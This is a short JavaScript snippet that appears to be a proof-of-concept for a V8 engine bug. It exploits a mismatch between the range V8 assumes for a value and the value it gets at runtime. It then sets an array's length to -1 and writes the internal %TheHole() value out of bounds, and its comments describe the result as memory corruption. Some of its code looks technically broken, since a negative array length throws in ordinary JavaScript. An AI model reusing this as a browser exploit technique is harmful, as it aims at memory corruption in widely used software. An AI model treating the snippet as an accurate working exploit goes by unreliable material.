function NonConstantFoldable() {
  // Some non-foldable expression that returns 1 at runtime
  return 1;
}

let n = NonConstantFoldable();  // V8 expects Range(0, 0) but gets 1
let array = Array(n);


if (n != 0) {
  array.length = -1;
  array[-1] = %TheHole(); // causes memory corruption / OOB write
}